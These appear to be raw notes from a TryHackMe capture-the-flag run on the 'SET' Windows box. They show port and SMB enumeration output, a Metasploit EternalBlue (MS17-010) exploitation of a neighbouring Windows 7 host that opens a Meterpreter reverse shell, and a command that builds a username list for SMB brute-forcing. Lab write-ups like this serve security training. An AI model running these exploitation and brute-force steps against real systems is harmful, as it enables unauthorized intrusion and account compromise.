---
title: "SET"
type: docs
tags:
  - thm
  - windows
  - medium
  - active-directory
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Windows (AD, `windcorp.thm`), **Difficulty:** Medium

</div>

<div class="callout callout-note">

Second run at the **SET** box (a later `v7` revision). See also **[SET (Medium)](/writeups/tryhackme/windows/medium/set/)** and ****SET (raw notes) (Medium)****. Full recorded notes for this run below.

</div>

---

## Full Walkthrough

❯ python3 enum4linux-ng.py 10.10.228.78 -A
ENUM4LINUX - next generation

```console
 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.228.78
[*] Username ......... ''
[*] Random Username .. 'dzaofjqx'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)
```

```console
 ====================================
|    Service Scan on 10.10.228.78    |
 ====================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: timed out
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: timed out
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[-] Could not connect to SMB over NetBIOS on 139/tcp: timed out
```

```console
 ====================================================
|    NetBIOS Names and Workgroup for 10.10.228.78    |
 ====================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out
```

 =========================================
|    SMB Dialect Check on 10.10.228.78    |
 =========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
SMB 1.0: false
SMB 2.02: true
SMB 2.1: true
SMB 3.0: true
SMB1 only: false
Preferred dialect: SMB 3.0
SMB signing required: false

```console
 =========================================
|    RPC Session Check on 10.10.228.78    |
 =========================================
[*] Check for null session
[-] Could not establish null session: STATUS_ACCESS_DENIED
[*] Check for random user session
[-] Could not establish random user session: STATUS_INVALID_PARAMETER
[-] Sessions failed, neither null nor user sessions were possible
```

 ===========================================================
|    Domain Information via SMB session for 10.10.228.78    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: SET
NetBIOS domain name: ''
DNS domain: SET
FQDN: SET

 ===============================================
|    OS Information via RPC for 10.10.228.78    |
 ===============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, null or user session required
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null


❯ rustscan -a 10.10.228.78 -- -p-
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/k1b0r/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.228.78:135
Open 10.10.228.78:443
Open 10.10.228.78:445
Open 10.10.228.78:5985
Open 10.10.228.78:49666
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -p-" on ip 10.10.228.78
Depending on the complexity of the script, results may take some time to appear.
Only 1 -p option allowed, separate multiple ranges with commas.
QUITTING!
[!] Error Exit code = 1


```console
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-04 14:47 EST
Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.32% done; ETC: 14:47 (0:00:00 remaining)
Nmap scan report for set.thm (10.10.228.78)
Host is up (0.088s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
443/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=set.windcorp.thm
| Subject Alternative Name: DNS:set.windcorp.thm, DNS:seth.windcorp.thm
| Not valid before: 2020-06-07T15:00:22
|_Not valid after:  2036-10-07T15:10:21
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2021-12-04T19:48:17+00:00; 0s from scanner time.
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```console
Host script results:
| smb2-time: 
|   date: 2021-12-04T19:47:39
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.06 seconds


```console
ikto -h https://set.thm/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.228.78
+ Target Hostname:    set.thm
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /CN=set.windcorp.thm
                   Altnames: set.windcorp.thm, seth.windcorp.thm
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /CN=set.windcorp.thm
+ Start Time:         2021-12-04 14:49:20 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-HTTPAPI/2.0
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
```


DNS: set.windcorp.thm, seth.windcorp/thm

https://set.windcorp.thm/ is an actual website

possible user: mailto:contact@windcorp.thm"

Flexor v2.1.1

❯ k1b0r@pwned~/thm/Set_v7 
❯ sudo nbtscan -r 10.10.228.78/24
Doing NBT name scan for addresses from 10.10.228.78/24

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
10.10.228.57     JON-PC           <server>  <unknown>        02:07:29:b5:b3:57

❯ k1b0r@pwned~/thm/Set_v7 took 19s 
❯ rustscan -a 10.10.228.57 -- -p-
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/k1b0r/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.228.57:135
Open 10.10.228.57:139
Open 10.10.228.57:445
Open 10.10.228.57:3389
Open 10.10.228.57:49152
Open 10.10.228.57:49153
Open 10.10.228.57:49154
Open 10.10.228.57:49158
Open 10.10.228.57:49160
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -p-" on ip 10.10.228.57
Depending on the complexity of the script, results may take some time to appear.
Only 1 -p option allowed, separate multiple ranges with commas.
QUITTING!
[!] Error Exit code = 1


we discovered another node under the network

 python3 enum4linux-ng.py -A 10.10.228.57
ENUM4LINUX - next generation

```console
 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.228.57
[*] Username ......... ''
[*] Random Username .. 'vrhvbspd'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)
```

```console
 ====================================
|    Service Scan on 10.10.228.57    |
 ====================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp
```

 ====================================================
|    NetBIOS Names and Workgroup for 10.10.228.57    |
 ====================================================
[+] Got domain/workgroup name: WORKGROUP
[+] Full NetBIOS names information:
- JON-PC          <00> -         B <ACTIVE>  Workstation Service
- WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
- JON-PC          <20> -         B <ACTIVE>  File Server Service
- WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
- WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
- ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
- MAC Address = 02-07-29-B5-B3-57

 =========================================
|    SMB Dialect Check on 10.10.228.57    |
 =========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
SMB 1.0: true
SMB 2.02: true
SMB 2.1: true
SMB 3.0: false
SMB1 only: false
Preferred dialect: SMB 2.1
SMB signing required: false

```console
 =========================================
|    RPC Session Check on 10.10.228.57    |
 =========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user session
[-] Could not establish random user session: STATUS_LOGON_FAILURE
```

```console
 ===================================================
|    Domain Information via RPC for 10.10.228.57    |
 ===================================================
[-] Could not get domain information via 'lsaquery': STATUS_ACCESS_DENIED
```

 ===========================================================
|    Domain Information via SMB session for 10.10.228.57    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: JON-PC
NetBIOS domain name: ''
DNS domain: Jon-PC
FQDN: Jon-PC

 ===============================================
|    OS Information via RPC for 10.10.228.57    |
 ===============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 7 Professional 7601 Service Pack 1
OS version: '6.1'
OS release: ''
OS build: '7601'
Native OS: Windows 7 Professional 7601 Service Pack 1
Native LAN manager: Windows 7 Professional 6.1
Platform id: null
Server type: null
Server type string: null

```console
 =====================================
|    Users via RPC on 10.10.228.57    |
 =====================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED
```

```console
 ======================================
|    Groups via RPC on 10.10.228.57    |
 ======================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED
```

```console
 ======================================
|    Shares via RPC on 10.10.228.57    |
 ======================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user
```

```console
 =========================================
|    Policies via RPC for 10.10.228.57    |
 =========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed
```

```console
 =========================================
|    Printers via RPC for 10.10.228.57    |
 =========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED
```

Completed after 12.56 seconds


msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.228.57
rhosts => 10.10.228.57
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost tun0
lhost => tun0
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

```console
[*] Started reverse TCP handler on 10.9.10.0:4444 
[*] 10.10.228.57:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.228.57:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.228.57:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.228.57:445 - The target is vulnerable.
[*] 10.10.228.57:445 - Connecting to target for exploitation.
[+] 10.10.228.57:445 - Connection established for exploitation.
[+] 10.10.228.57:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.228.57:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.228.57:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.228.57:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.228.57:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.228.57:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.228.57:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.228.57:445 - Sending all but last fragment of exploit packet
[*] 10.10.228.57:445 - Starting non-paged pool grooming
[+] 10.10.228.57:445 - Sending SMBv2 buffers
[+] 10.10.228.57:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.228.57:445 - Sending final SMBv2 buffers.
[*] 10.10.228.57:445 - Sending last fragment of exploit packet!
[*] 10.10.228.57:445 - Receiving response from exploit packet
[+] 10.10.228.57:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.228.57:445 - Sending egg to corrupted connection.
[*] 10.10.228.57:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.10.228.57
[*] Meterpreter session 1 opened (10.9.10.0:4444 -> 10.10.228.57:49241) at 2021-12-04 15:12:02 -0500
[+] 10.10.228.57:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.228.57:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.228.57:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

meterpreter > 


got the shell

https://set.windcorp.thm/index.html

we entered for ex a

Aaron Wheeler 9553310397  aaronwhe@windcorp.thm


when we do that look at network tab we see its calling to a file called users.xml


after download the xml file we do this

xmllint  --xpath "//row/email"  users.xml | sed -e 's/<email>//g' | sed -e 's/<\/email>//g' | sed -e 's/@windcorp.thm//g'> users.txt

to make a file with only the usernames now msf bruteforce against the smb
